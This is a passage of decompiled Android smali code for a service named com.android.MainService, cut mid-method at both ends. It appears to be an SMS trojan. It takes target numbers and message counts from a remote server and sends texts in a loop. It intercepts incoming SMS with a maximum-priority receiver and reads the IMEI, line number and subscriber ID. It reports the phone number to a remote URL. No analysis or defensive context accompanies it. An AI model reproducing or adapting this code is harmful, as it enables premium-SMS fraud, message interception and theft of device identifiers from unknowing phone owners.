    const/4 v5, -0x2

    .line 291
    .local v5, flag:I
    const/4 v12, 0x0

    .line 294
    .local v12, result:I
    :try_start_0
    const-string v22, "<sendnum>"

    .line 295
    const-string v23, "</sendnum>"

    .line 294
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 296
    const-string v22, ""

    move-object/from16 v0, v22

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v22

    if-eqz v22, :cond_0

    .line 386
    const/16 v22, 0x0

    aget-object v22, p2, v22

    const/16 v23, 0xc

    invoke-static/range {v22 .. v23}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 387
    new-instance v22, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x1

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x2

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 388
    .local v11, logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v22, v0

    move-object v0, v11

    move-object/from16 v1, v22

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 389
    move-object/from16 v0, p0

    move v1, v5

    move v2, v12

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 391
    :goto_0
    return-void

    .line 299
    .end local v11           #logtxt:Ljava/lang/String;
    :cond_0
    :try_start_1
    const-string v22, "<sendchannel>"

    .line 300
    const-string v23, "</sendchannel>"

    .line 299
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 303
    const-string v22, "<shieldnum>"

    const-string v23, "</shieldnum>"

    .line 302
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v21

    .line 304
    .local v21, tmpshieldnum:Ljava/lang/String;
    const-string v22, ""

    move-object/from16 v0, v22

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_1

    .line 305
    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 308
    :cond_1
    const-string v22, "<shieldcon>"

    const-string v23, "</shieldcon>"

    .line 307
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    .line 309
    .local v20, tmpshieldcon:Ljava/lang/String;
    const-string v22, ""

    move-object/from16 v0, v22

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_2

    .line 310
    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->shieldcon:Ljava/lang/String;

    .line 312
    :cond_2
    const-string v22, "<exactnum>"

    .line 313
    const-string v23, "</exactnum>"

    .line 312
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 314
    .local v19, tmpexactnum:Ljava/lang/String;
    const-string v22, ""

    move-object/from16 v0, v22

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_3

    .line 315
    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 317
    :cond_3
    const-string v22, "<sendcount>"

    .line 318
    const-string v23, "</sendcount>"

    .line 317
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 321
    const-string v22, "<isreset>"

    const-string v23, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 322
    const-string v22, "no"

    move-object/from16 v0, v22

    move-object v1, v10

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 326
    const/4 v9, 0x1

    .line 327
    .local v9, isexec:Z
    const-string v22, "<isblack>"

    .line 328
    const-string v23, "</isblack>"

    .line 327
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 329
    .local v7, isblack:Ljava/lang/String;
    const-string v22, "1"

    move-object/from16 v0, v22

    move-object v1, v7

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-eqz v22, :cond_6

    .line 330
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->tel:Ljava/lang/String;

    move-object/from16 v22, v0

    if-eqz v22, :cond_4

    const-string v22, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->tel:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-virtual/range {v22 .. v23}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-eqz v22, :cond_6

    .line 333
    :cond_4
    const-string v22, "<telnourl>"

    const-string v23, "</telnourl>"

    .line 332
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 335
    .local v18, telnourl:Ljava/lang/String;
    const-string v22, "<execblackurl>"

    const-string v23, "</execblackurl>"

    .line 334
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 336
    .local v4, execblackurl:Ljava/lang/String;
    const-string v22, ""

    move-object/from16 v0, v22

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_6

    const-string v22, ""

    move-object/from16 v0, v22

    move-object v1, v4

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_6

    .line 338
    invoke-static/range {v18 .. v18}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 339
    .local v17, telStr:Ljava/lang/String;
    if-eqz v17, :cond_6

    const-string v22, ""

    move-object/from16 v0, v17

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-nez v22, :cond_6

    .line 340
    invoke-virtual/range {v17 .. v17}, Ljava/lang/String;->length()I

    move-result v22

    const/16 v23, 0x1f4

    move/from16 v0, v22

    move/from16 v1, v23

    if-le v0, v1, :cond_5

    .line 341
    const/16 v22, 0x0

    const/16 v23, 0x1f3

    move-object/from16 v0, v17

    move/from16 v1, v22

    move/from16 v2, v23

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v17

    .line 345
    :cond_5
    new-instance v22, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v23, "/?tel="

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    .line 346
    move-object/from16 v0, v22

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    .line 345
    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v22 .. v22}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 347
    .local v8, iscontinue:Ljava/lang/String;
    const-string v22, "1"

    move-object/from16 v0, v22

    move-object v1, v8

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-eqz v22, :cond_6

    .line 348
    const/4 v9, 0x0

    .line 349
    const/16 v5, -0x2b

    .line 355
    .end local v4           #execblackurl:Ljava/lang/String;
    .end local v8           #iscontinue:Ljava/lang/String;
    .end local v17           #telStr:Ljava/lang/String;
    .end local v18           #telnourl:Ljava/lang/String;
    :cond_6
    if-eqz v9, :cond_9

    .line 356
    const-string v22, "test"

    move-object/from16 v0, v22

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v22

    if-eqz v22, :cond_7

    .line 357
    new-instance v22, Ljava/lang/StringBuilder;

    const-string v23, "test:"

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    .line 359
    :cond_7
    const-string v22, "<is_second>"

    .line 360
    const-string v23, "</is_second>"

    .line 359
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->is_second:Ljava/lang/String;

    .line 361
    const-string v22, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->is_second:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-virtual/range {v22 .. v23}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v22

    if-eqz v22, :cond_8

    .line 363
    const-string v22, "<second_filter_port>"

    const-string v23, "</second_filter_port>"

    .line 362
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->second_filter_port:Ljava/lang/String;

    .line 365
    const-string v22, "<second_filter_info>"

    const-string v23, "</second_filter_info>"

    .line 364
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->second_filter_info:Ljava/lang/String;

    .line 367
    const-string v22, "<reply_start_str>"

    const-string v23, "</reply_start_str>"

    .line 366
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->reply_start_str:Ljava/lang/String;

    .line 369
    const-string v22, "<reply_end_str>"

    const-string v23, "</reply_end_str>"

    .line 368
    move-object/from16 v0, p1

    move-object/from16 v1, v22

    move-object/from16 v2, v23

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->reply_end_str:Ljava/lang/String;

    .line 371
    :cond_8
    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v14

    .line 372
    .local v14, sendcounts:I
    const/4 v6, 0x0

    .local v6, i:I
    :goto_1
    if-lt v6, v14, :cond_a

    .line 386
    .end local v6           #i:I
    .end local v14           #sendcounts:I
    :cond_9
    const/16 v22, 0x0

    aget-object v22, p2, v22

    const/16 v23, 0xc

    invoke-static/range {v22 .. v23}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 387
    new-instance v22, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x1

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x2

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 388
    .restart local v11       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v22, v0

    move-object v0, v11

    move-object/from16 v1, v22

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 389
    move-object/from16 v0, p0

    move v1, v5

    move v2, v12

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 373
    .end local v11           #logtxt:Ljava/lang/String;
    .restart local v6       #i:I
    .restart local v14       #sendcounts:I
    :cond_a
    :try_start_2
    move-object/from16 v0, p0

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 374
    add-int/lit8 v12, v12, 0x1

    .line 376
    const-wide/16 v22, 0x3a98

    :try_start_3
    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 372
    :goto_2
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 382
    .end local v6           #i:I
    .end local v7           #isblack:Ljava/lang/String;
    .end local v9           #isexec:Z
    .end local v14           #sendcounts:I
    .end local v19           #tmpexactnum:Ljava/lang/String;
    .end local v20           #tmpshieldcon:Ljava/lang/String;
    .end local v21           #tmpshieldnum:Ljava/lang/String;
    :catch_0
    move-exception v22

    move-object/from16 v3, v22

    .line 383
    .local v3, e:Ljava/lang/Exception;
    const/16 v5, -0x2c

    .line 386
    const/16 v22, 0x0

    aget-object v22, p2, v22

    const/16 v23, 0xc

    invoke-static/range {v22 .. v23}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v22

    move-object/from16 v0, v22

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 387
    new-instance v22, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v23, v0

    invoke-static/range {v23 .. v23}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v23

    invoke-direct/range {v22 .. v23}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x1

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const-string v23, "|"

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    const/16 v23, 0x2

    aget-object v23, p2, v23

    invoke-virtual/range {v22 .. v23}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v22

    invoke-virtual/range {v22 .. v22}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 388
    .restart local v11       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v22, v0

    move-object v0, v11

    move-object/from16 v1, v22

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 389
    move-object/from16 v0, p0

    move v1, v5

    move v2, v12

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 384
    .end local v3           #e:Ljava/lang/Exception;
    .end local v11           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v22

    .line 386
    const/16 v23, 0x0

    aget-object v23, p2, v23

    const/16 v24, 0xc

    invoke-static/range {v23 .. v24}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v23

    move-object/from16 v0, v23

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 387
    new-instance v23, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v24, v0

    invoke-static/range {v24 .. v24}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v24

    invoke-direct/range {v23 .. v24}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v24, "|"

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    const/16 v24, 0x1

    aget-object v24, p2, v24

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    const-string v24, "|"

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    const/16 v24, 0x2

    aget-object v24, p2, v24

    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v23

    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 388
    .restart local v11       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v23, v0

    move-object v0, v11

    move-object/from16 v1, v23

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 389
    move-object/from16 v0, p0

    move v1, v5

    move v2, v12

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 390
    throw v22

    .line 377
    .end local v11           #logtxt:Ljava/lang/String;
    .restart local v6       #i:I
    .restart local v7       #isblack:Ljava/lang/String;
    .restart local v9       #isexec:Z
    .restart local v14       #sendcounts:I
    .restart local v19       #tmpexactnum:Ljava/lang/String;
    .restart local v20       #tmpshieldcon:Ljava/lang/String;
    .restart local v21       #tmpshieldnum:Ljava/lang/String;
    :catch_1
    move-exception v22

    goto/16 :goto_2
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .parameter "intent"

    .prologue
    .line 770
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 20

    .prologue
    .line 93
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/MainService;->ismark:Z

    move v3, v0

    if-eqz v3, :cond_0

    .line 94
    invoke-direct/range {p0 .. p0}, Lcom/android/MainService;->defaultMark()V

    .line 97
    :cond_0
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    .line 98
    new-instance v17, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.send"

    move-object/from16 v0, v17

    move-object v1, v3

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 99
    .local v17, sendFilter:Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 101
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    .line 102
    new-instance v9, Landroid/content/IntentFilter;

    const-string v3, "com.test.sms.delivery"

    invoke-direct {v9, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 103
    .local v9, deliveryFilter:Landroid/content/IntentFilter;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v9

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 105
    new-instance v3, Lcom/android/MainService$SMSReceiver;

    move-object v0, v3

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/android/MainService$SMSReceiver;-><init>(Lcom/android/MainService;)V

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    .line 106
    new-instance v14, Landroid/content/IntentFilter;

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v14, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 107
    .local v14, receiverFilter:Landroid/content/IntentFilter;
    const v3, 0x7fffffff

    invoke-virtual {v14, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 108
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    move-object v3, v0

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v14

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 111
    const-string v3, "androidh.log"

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move-object v1, v3

    move v2, v4

    invoke-virtual {v0, v1, v2}, Lcom/android/MainService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v3

    .line 112
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    .line 111
    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    .line 113
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_1

    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 115
    :cond_1
    const-string v3, "phone"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-virtual {v0, v1}, Lcom/android/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v19

    .line 114
    check-cast v19, Landroid/telephony/TelephonyManager;

    .line 116
    .local v19, tm:Landroid/telephony/TelephonyManager;
    if-eqz v19, :cond_3

    .line 117
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 118
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 119
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

